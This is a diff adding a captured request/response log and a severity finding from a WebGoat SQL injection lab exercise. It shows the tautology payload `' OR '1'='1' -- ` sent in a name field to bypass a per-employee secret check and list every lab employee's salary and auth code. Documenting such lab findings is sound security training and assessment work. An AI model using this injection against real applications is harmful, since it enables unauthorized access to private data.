@@ -1,0 +1,40 @@
+Lesson: SQL Injection (intro) / assignment SqlInjectionLesson8 ("Compromising confidentiality with String SQL injection")
+Captured via Chrome DevTools Network panel (live browser interaction), Run #9, 2026-11-16T11:16:23Z
+
+### Request
+POST http://10.242.10.31:8007/WebGoat/SqlInjection/attack8 HTTP/1.1
+Referer: http://10.242.10.31:8007/WebGoat/start.mvc
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 34
+Cookie: JSESSIONID=EB5681DBBE34AF0FD5E2A4E855CBA117
+Origin: http://10.242.10.31:8007
+Host: 10.242.10.31:8007
+
+name='+OR+'1'%3D'1'+--+&auth_tan=x
+
+(decoded: name=' OR '1'='1' -- , auth_tan=x)
+
+### Response
+HTTP/1.1 200
+Content-Type: application/json
+Content-Length: 1136
+
+{
+  "assignment" : "SqlInjectionLesson8",
+  "attemptWasMade" : true,
+  "feedback" : "You have succeeded! You successfully compromised the confidentiality of data by viewing internal information that you should not have access to. Well done!",
+  "lessonCompleted" : true,
+  "output" : "<table>...USERID/FIRST_NAME/LAST_NAME/DEPARTMENT/SALARY/AUTH_TAN/PHONE rows for all 5 employees (Paulina
+  Travers/46000/P45JSI, Abraham Holman/50000/UU2ALK, John Smith/64350/3SL99A, Tobi Barnett/77000/TA9LL1,
+  Bob Franco/83700/LO9S2V) ...</table>"
+}
+
+### Analysis (finding F-SQLI-03)
+The app's own intended design requires a per-employee secret "auth_tan" to view that employee's own salary
+record (`SELECT * FROM employees WHERE last_name = '<name>' AND auth_tan = '<tan>'`). Injecting
+`' OR '1'='1' -- ` into the name field with an arbitrary/unknown TAN ("x") bypassed the authentication-TAN
+check entirely via SQL injection and disclosed EVERY employee's salary and real auth_tan secret in one request
+- a full authorization-bypass via SQLi, not just a generic read.
+Severity: HIGH per Section 3j rubric - "full authentication/authorization bypass" + full sensitive-data
+exfiltration, via unsanitized string concatenation (ASVS V1.2.4).
